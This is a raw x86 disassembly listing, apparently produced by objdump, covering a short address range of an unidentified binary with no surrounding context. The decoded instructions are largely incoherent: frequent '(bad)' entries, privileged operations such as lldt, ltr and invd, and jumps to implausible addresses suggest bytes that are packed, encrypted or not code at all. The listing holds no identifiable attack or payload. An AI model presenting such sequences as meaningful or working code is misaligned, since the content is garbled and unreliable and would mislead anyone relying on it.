  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
